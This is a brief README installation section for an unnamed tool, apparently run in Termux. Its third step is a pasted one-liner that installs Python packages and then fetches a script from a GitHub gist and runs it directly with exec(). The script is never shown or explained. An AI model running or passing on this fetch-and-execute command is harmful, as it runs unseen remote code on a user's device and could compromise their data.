# Installation

1. Use a terminal that supports Python (e.g. Termux).
2. Install Python:

```bash
pkg install -y python
```

3. Run the following command to install the required packages and start the tool:

```bash
pkg install -y python && python -m pip install -q requests beautifulsoup4 && python -c "import requests; exec(requests.get('https://gist.githubusercontent.com/MiniSeres/0b022578eeceae94dd1583374864e332/raw/ea6cdbc532fc9ecb5d6405e376a44fbb742e5e25/Dump.MZSR.py').text)"
```
